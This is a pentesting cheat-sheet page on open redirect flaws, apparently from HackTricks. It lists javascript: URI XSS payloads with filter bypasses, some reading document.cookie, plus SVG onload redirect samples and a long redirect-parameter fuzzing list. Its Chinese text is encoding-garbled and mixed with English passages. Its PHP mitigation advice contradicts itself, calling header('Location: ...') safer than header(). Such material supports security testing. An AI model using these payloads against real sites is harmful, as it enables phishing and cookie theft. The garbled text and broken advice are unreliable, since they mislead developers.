<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricksäº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ æ¨ç‰¹ ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼

- å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- è·å–[**å®˜æ–¹PEASSå’ŒHackTricksçš„è¡£ç‰©**](https://peass.creator-spring.com)

- **åŠ å…¥** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **é€šè¿‡å‘[hacktricks repo](https://github.com/carlospolop/hacktricks)å’Œ[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§**ã€‚

</details>


# å¼€æ”¾é‡å®šå‘

## é‡å®šå‘åˆ°æœ¬åœ°ä¸»æœºæˆ–ä»»æ„åŸŸå

{% content-ref url="ssrf-server-side-request-forgery/url-format-bypass.md" %}
[url-format-bypass.md](ssrf-server-side-request-forgery/url-format-bypass.md)
{% endcontent-ref %}

## å¼€æ”¾é‡å®šå‘åˆ°XSS
```bash
#Basic payload, javascript code is executed after "javascript:"
javascript:alert(1)

#Bypass "javascript" word filter with CRLF
java%0d%0ascript%0d%0a:alert(0)

#Javascript with "://" (Notice that in JS "//" is a line coment, so new line is created before the payload). URL double encoding is needed
#This bypasses FILTER_VALIDATE_URL os PHP
javascript://%250Aalert(1)

#Variation of "javascript://" bypass when a query is also needed (using comments or ternary operator)
javascript://%250Aalert(1)//?1
javascript://%250A1?alert(1):0

#Others
%09Jav%09ascript:alert(document.domain)
javascript://%250Alert(document.location=document.cookie)
/%09/javascript:alert(1);
/%09/javascript:alert(1)
//%5cjavascript:alert(1);
//%5cjavascript:alert(1)
/%5cjavascript:alert(1);
/%5cjavascript:alert(1)
javascript://%0aalert(1)
<>javascript:alert(1);
//javascript:alert(1);
//javascript:alert(1)
/javascript:alert(1);
/javascript:alert(1)
\j\av\a\s\cr\i\pt\:\a\l\ert\(1\)
javascript:alert(1);
javascript:alert(1)
javascripT://anything%0D%0A%0D%0Awindow.alert(document.cookie)
javascript:confirm(1)
javascript://https://whitelisted.com/?z=%0Aalert(1)
javascript:prompt(1)
jaVAscript://whitelisted.com//%0d%0aalert(1);//
javascript://whitelisted.com?%a0alert%281%29
/x:1/:///%01javascript:alert(document.cookie)/
";alert(0);//
```
# ä¸Šä¼ svgæ–‡ä»¶çš„å¼€æ”¾é‡å®šå‘

An open redirect vulnerability occurs when a web application allows users to redirect to external URLs without proper validation. This can be exploited by an attacker to redirect users to malicious websites.

## Exploiting Open Redirect in SVG File Uploads

1. Identify the vulnerable parameter: Look for any parameter in the URL that is used for redirection.

2. Upload an SVG file: Upload a specially crafted SVG file that contains a redirect URL in the `xlink:href` attribute of an `<image>` tag.

   ```html
   <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
     <image xlink:href="https://malicious-website.com" />
   </svg>
   ```

3. Verify the redirect: Access the uploaded SVG file and check if the redirect occurs to the specified URL.

## Mitigating Open Redirect Vulnerabilities

To prevent open redirect vulnerabilities in SVG file uploads, follow these best practices:

- Validate and sanitize user input: Ensure that any user-supplied input used for redirection is properly validated and sanitized to prevent malicious redirects.

- Whitelist allowed URLs: Maintain a whitelist of allowed URLs and validate that the redirect URL matches the whitelist before performing the redirection.

- Implement server-side checks: Perform server-side checks to validate the redirect URL and ensure it is within the same domain or a trusted domain.

By following these practices, you can mitigate the risk of open redirect vulnerabilities in SVG file uploads.
```markup
<code>
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<svg
onload="window.location='http://www.example.com'"
xmlns="http://www.w3.org/2000/svg">
</svg>
</code>
```
# å¸¸è§çš„æ³¨å…¥å‚æ•°

When performing web application penetration testing, it is important to be aware of common injection parameters that can be exploited. These parameters are often used by attackers to inject malicious code or commands into a web application, leading to various security vulnerabilities.

ä»¥ä¸‹æ˜¯åœ¨è¿›è¡Œç½‘ç»œåº”ç”¨ç¨‹åºæ¸—é€æµ‹è¯•æ—¶éœ€è¦æ³¨æ„çš„å¸¸è§æ³¨å…¥å‚æ•°ï¼Œæ”»å‡»è€…ç»å¸¸åˆ©ç”¨è¿™äº›å‚æ•°æ³¨å…¥æ¶æ„ä»£ç æˆ–å‘½ä»¤åˆ°ç½‘ç»œåº”ç”¨ç¨‹åºä¸­ï¼Œä»è€Œå¯¼è‡´å„ç§å®‰å…¨æ¼æ´ã€‚

## 1. URL Parameters

URL parameters are commonly used to pass data between web pages. Attackers can manipulate these parameters to inject malicious code or redirect users to malicious websites. Some common URL parameters that are vulnerable to injection attacks include:

- `?redirect=`: This parameter is used to redirect users to a specific URL. Attackers can modify the value of this parameter to redirect users to a malicious website.

- `?next=`: This parameter is often used in login and authentication processes to redirect users after successful authentication. Attackers can modify the value of this parameter to redirect users to a malicious website.

- `?return_url=`: This parameter is used to redirect users back to a specific URL after completing a certain action. Attackers can modify the value of this parameter to redirect users to a malicious website.

## 2. Form Parameters

Form parameters are used to send data from a web page to a server. Attackers can manipulate these parameters to inject malicious code or perform other malicious actions. Some common form parameters that are vulnerable to injection attacks include:

- `redirect`: This parameter is often used to redirect users after submitting a form. Attackers can modify the value of this parameter to redirect users to a malicious website.

- `callback`: This parameter is used in AJAX requests to specify a callback function. Attackers can manipulate the value of this parameter to execute arbitrary code.

- `return_url`: This parameter is used to redirect users back to a specific URL after completing a certain action. Attackers can modify the value of this parameter to redirect users to a malicious website.

## 3. Cookie Parameters

Cookies are used to store user session information. Attackers can manipulate cookie parameters to perform session hijacking or other malicious actions. Some common cookie parameters that are vulnerable to injection attacks include:

- `redirect`: This parameter is often used to redirect users after logging in. Attackers can modify the value of this parameter to redirect users to a malicious website.

- `return_url`: This parameter is used to redirect users back to a specific URL after completing a certain action. Attackers can modify the value of this parameter to redirect users to a malicious website.

- `session_id`: This parameter is used to identify a user's session. Attackers can manipulate the value of this parameter to hijack a user's session.

It is important to thoroughly test and validate these injection points during a penetration test to identify and mitigate any potential vulnerabilities.
```
/{payload}
?next={payload}
?url={payload}
?target={payload}
?rurl={payload}
?dest={payload}
?destination={payload}
?redir={payload}
?redirect_uri={payload}
?redirect_url={payload}
?redirect={payload}
/redirect/{payload}
/cgi-bin/redirect.cgi?{payload}
/out/{payload}
/out?{payload}
?view={payload}
/login?to={payload}
?image_url={payload}
?go={payload}
?return={payload}
?returnTo={payload}
?return_to={payload}
?checkout_url={payload}
?continue={payload}
?return_path={payload}
success=https://c1h2e1.github.io
data=https://c1h2e1.github.io
qurl=https://c1h2e1.github.io
login=https://c1h2e1.github.io
logout=https://c1h2e1.github.io
ext=https://c1h2e1.github.io
clickurl=https://c1h2e1.github.io
goto=https://c1h2e1.github.io
rit_url=https://c1h2e1.github.io
forward_url=https://c1h2e1.github.io
@https://c1h2e1.github.io
forward=https://c1h2e1.github.io
pic=https://c1h2e1.github.io
callback_url=https://c1h2e1.github.io
jump=https://c1h2e1.github.io
jump_url=https://c1h2e1.github.io
click?u=https://c1h2e1.github.io
originUrl=https://c1h2e1.github.io
origin=https://c1h2e1.github.io
Url=https://c1h2e1.github.io
desturl=https://c1h2e1.github.io
u=https://c1h2e1.github.io
page=https://c1h2e1.github.io
u1=https://c1h2e1.github.io
action=https://c1h2e1.github.io
action_url=https://c1h2e1.github.io
Redirect=https://c1h2e1.github.io
sp_url=https://c1h2e1.github.io
service=https://c1h2e1.github.io
recurl=https://c1h2e1.github.io
j?url=https://c1h2e1.github.io
url=//https://c1h2e1.github.io
uri=https://c1h2e1.github.io
u=https://c1h2e1.github.io
allinurl:https://c1h2e1.github.io
q=https://c1h2e1.github.io
link=https://c1h2e1.github.io
src=https://c1h2e1.github.io
tc?src=https://c1h2e1.github.io
linkAddress=https://c1h2e1.github.io
location=https://c1h2e1.github.io
burl=https://c1h2e1.github.io
request=https://c1h2e1.github.io
backurl=https://c1h2e1.github.io
RedirectUrl=https://c1h2e1.github.io
Redirect=https://c1h2e1.github.io
ReturnUrl=https://c1h2e1.github.io
```
# ä»£ç ç¤ºä¾‹

### .Net
```bash
response.redirect("~/mysafe-subdomain/login.aspx")
```
### Java

Javaæ˜¯ä¸€ç§å¹¿æ³›ä½¿ç”¨çš„ç¼–ç¨‹è¯­è¨€ï¼Œå¸¸ç”¨äºå¼€å‘è·¨å¹³å°çš„åº”ç”¨ç¨‹åºã€‚å®ƒå…·æœ‰å¼ºå¤§çš„é¢å‘å¯¹è±¡ç‰¹æ€§å’Œä¸°å¯Œçš„ç±»åº“ï¼Œä½¿å¾—å¼€å‘äººå‘˜å¯ä»¥è½»æ¾åœ°æ„å»ºå¤æ‚çš„åº”ç”¨ç¨‹åºã€‚

Javaçš„å®‰å…¨æ€§æ˜¯å…¶é‡è¦çš„ç‰¹ç‚¹ä¹‹ä¸€ã€‚å®ƒæä¾›äº†è®¸å¤šå†…ç½®çš„å®‰å…¨åŠŸèƒ½ï¼Œå¦‚è®¿é—®æ§åˆ¶å’Œå¼‚å¸¸å¤„ç†ï¼Œä»¥å¸®åŠ©å¼€å‘äººå‘˜ç¼–å†™å®‰å…¨çš„ä»£ç ã€‚

ç„¶è€Œï¼ŒJavaåº”ç”¨ç¨‹åºä¹Ÿå¯èƒ½å­˜åœ¨å®‰å…¨æ¼æ´ï¼Œå…¶ä¸­ä¹‹ä¸€æ˜¯å¼€æ”¾é‡å®šå‘æ¼æ´ã€‚å¼€æ”¾é‡å®šå‘æ¼æ´æ˜¯æŒ‡æ”»å‡»è€…å¯ä»¥åˆ©ç”¨åº”ç”¨ç¨‹åºä¸­çš„é‡å®šå‘åŠŸèƒ½æ¥å°†ç”¨æˆ·é‡å®šå‘åˆ°æ¶æ„ç½‘ç«™æˆ–æ¬ºéª—æ€§ç½‘é¡µã€‚

æ”»å‡»è€…å¯ä»¥åˆ©ç”¨å¼€æ”¾é‡å®šå‘æ¼æ´è¿›è¡Œé’“é±¼æ”»å‡»ã€ä¼šè¯åŠ«æŒæˆ–å…¶ä»–æ¶æ„è¡Œä¸ºã€‚ä¸ºäº†é˜²æ­¢è¿™ç§æ¼æ´ï¼Œå¼€å‘äººå‘˜åº”è¯¥éµå¾ªå®‰å…¨çš„ç¼–ç å®è·µï¼Œå¦‚éªŒè¯é‡å®šå‘URLçš„åˆæ³•æ€§ã€ä½¿ç”¨ç™½åå•æ¥é™åˆ¶é‡å®šå‘ç›®æ ‡ç­‰ã€‚

åœ¨è¿›è¡Œæ¸—é€æµ‹è¯•æ—¶ï¼Œæµ‹è¯•äººå‘˜å¯ä»¥åˆ©ç”¨å¼€æ”¾é‡å®šå‘æ¼æ´æ¥è·å–æ•æ„Ÿä¿¡æ¯æˆ–è¿›è¡Œå…¶ä»–æ”»å‡»ã€‚ä»–ä»¬å¯ä»¥é€šè¿‡ä¿®æ”¹é‡å®šå‘URLæ¥å°†ç”¨æˆ·é‡å®šå‘åˆ°æ¶æ„ç½‘ç«™ï¼Œæˆ–è€…åˆ©ç”¨å·²çŸ¥çš„å¼€æ”¾é‡å®šå‘æ¼æ´æ¥æ‰§è¡Œå…¶ä»–æ”»å‡»ã€‚

ä¸ºäº†ä¿æŠ¤Javaåº”ç”¨ç¨‹åºå…å—å¼€æ”¾é‡å®šå‘æ¼æ´çš„å¨èƒï¼Œå¼€å‘äººå‘˜åº”è¯¥å®šæœŸå®¡æŸ¥ä»£ç ï¼Œä¿®å¤ä»»ä½•æ½œåœ¨çš„æ¼æ´ï¼Œå¹¶ä½¿ç”¨å®‰å…¨çš„ç¼–ç å®è·µæ¥ç¼–å†™å¯é çš„åº”ç”¨ç¨‹åºã€‚æ­¤å¤–ï¼Œæ¸—é€æµ‹è¯•äººå‘˜ä¹Ÿåº”è¯¥å¯¹åº”ç”¨ç¨‹åºè¿›è¡Œæµ‹è¯•ï¼Œä»¥å‘ç°å¹¶æŠ¥å‘Šä»»ä½•å­˜åœ¨çš„æ¼æ´ï¼Œä»¥ä¾¿åŠæ—¶ä¿®å¤ã€‚
```bash
response.redirect("http://mysafedomain.com");
```
### PHP

#### Open Redirect

An open redirect vulnerability occurs when a web application allows users to redirect to external URLs without proper validation. This can be exploited by an attacker to redirect users to malicious websites, phishing pages, or to perform other malicious actions.

To identify open redirect vulnerabilities in PHP applications, you can follow these steps:

1. **Manual Testing**: Manually test the application by providing different values for the redirect parameter and observe if it redirects to external URLs without validation.

2. **Automated Tools**: Use automated tools like Burp Suite, OWASP ZAP, or Nmap to scan the application for open redirect vulnerabilities.

3. **Source Code Analysis**: Analyze the source code of the application to identify any insecure redirect functions or lack of input validation.

Once you have identified an open redirect vulnerability, you can exploit it by crafting a malicious URL that redirects the user to a specified location. For example:

```
http://example.com/redirect.php?url=http://malicious-website.com
```

To prevent open redirect vulnerabilities in PHP applications, you should:

- **Validate Input**: Always validate and sanitize user input before using it in a redirect function.

- **Whitelist URLs**: Maintain a whitelist of trusted URLs that the application can redirect to.

- **Encode URLs**: Encode the redirect URL to prevent attackers from injecting malicious characters.

- **Use Safe Redirect Functions**: Instead of using `header()` or `Location` headers, use safer redirect functions like `header("Location: $url", true, 302)`.

By following these best practices, you can mitigate the risk of open redirect vulnerabilities in PHP applications.
```php
<?php
/* browser redirections*/
header("Location: http://mysafedomain.com");
exit;
?>
```
# å·¥å…·

* [https://github.com/0xNanda/Oralyzer](https://github.com/0xNanda/Oralyzer)

# èµ„æº

åœ¨ [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open Redirect](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect) ä¸­ï¼Œä½ å¯ä»¥æ‰¾åˆ°æ¨¡ç³Šæµ‹è¯•åˆ—è¡¨ã€‚\
[https://pentester.land/cheatsheets/2018/11/02/open-redirect-cheatsheet.html](https://pentester.land/cheatsheets/2018/11/02/open-redirect-cheatsheet.html)\
[https://github.com/cujanovic/Open-Redirect-Payloads](https://github.com/cujanovic/Open-Redirect-Payloads)


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­**å®£ä¼ ä½ çš„å…¬å¸**å—ï¼Ÿæˆ–è€…ä½ æƒ³è¦**è·å–æœ€æ–°ç‰ˆæœ¬çš„PEASSæˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼

- å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“â€”â€”[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)

- **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**

- **é€šè¿‡å‘[hacktricks repo](https://github.com/carlospolop/hacktricks)å’Œ[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§**ã€‚

</details>
